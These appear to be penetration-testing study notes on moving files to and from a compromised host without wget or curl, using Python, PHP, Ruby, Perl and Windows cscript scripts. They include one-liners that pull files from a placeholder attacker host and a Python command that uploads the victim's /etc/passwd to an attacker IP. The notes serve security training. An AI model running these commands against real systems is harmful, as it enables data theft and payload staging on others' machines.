- Sometime common file transfer utilities like wget or curl is not available
- If a programming language is installed, we can use it instead

---

## Python

- Python can execute a one-liner using `-c`.
- Python 3 can download a file using `urllib.request`

```bash
python3 -c 'import urllib.request; urllib.request.urlretrieve("http://ATTACKER/file", "file")'
```

- Python can also perform HTTP uploads using the `requests` module.

```bash
# Start an upload server in our machine
python3 -m uploadserver
```

```bash
# Upload the file from our victim to us
python3 -c 'import requests;requests.post("http://192.168.49.128:8000/upload",files={"files":open("/etc/passwd","rb")})'
```

```bash
# Explanation
# To use the requests function, we need to import the module first. 
import requests 
# Define the target URL where we will upload the file. 
URL = "http://192.168.49.128:8000/upload" 
# Define the file we want to read, open it and save it in a variable. 
file = open("/etc/passwd","rb") 
# Use a requests POST request to upload the file. 
r = requests.post(url,files={"files":file})
```

---

## PHP

- PHP can execute a one-liner with `-r`.
- It can download content and save it using:
- file_get_contents() & file_put_contents()

```bash
$file = file_get_contents("http://ATTACKER/file"); 
file_put_contents("file", $file);
```
---

## Ruby & Perl

- Ruby & Perl one-liner with -e
```bash
ruby -e 'require "net/http"; File.write("file", Net::HTTP.get(URI.parse("http://ATTACKER/file")))'
```

```bash
perl -e 'use LWP::Simple; getstore("[http://ATTACKER/file](http://ATTACKER/file)", "file");'
```

---

# Windows Scripting

## JavaScript

- Create a file called wget.js and save this script

```javascript
var WinHttpReq = new ActiveXObject("WinHttp.WinHttpRequest.5.1"); WinHttpReq.Open("GET", WScript.Arguments(0), /*async=*/false); WinHttpReq.Send(); BinStream = new ActiveXObject("ADODB.Stream"); 
BinStream.Type = 1; 
BinStream.Open(); 
BinStream.Write(WinHttpReq.ResponseBody); BinStream.SaveToFile(WScript.Arguments(1));
```

- `cscript.exe` can execute JavaScript files:
```cmd
cscript.exe /nologo wget.js http://ATTACKER/file
```

## VBScript

- Create a file called wget.vbs and save this script

```vbscript
dim xHttp: Set xHttp = createobject("Microsoft.XMLHTTP") 
dim bStrm: Set bStrm = createobject("Adodb.Stream") 
xHttp.Open "GET", WScript.Arguments.Item(0), False 
xHttp.Send 

with bStrm 
	.type = 1 
	.open 
	.write xHttp.responseBody 
	.savetofile WScript.Arguments.Item(1), 2 
end with
```

- `cscript.exe` can execute VBScript:
```cmd
cscript.exe /nologo wget.vbs http://ATTACKER/file
```
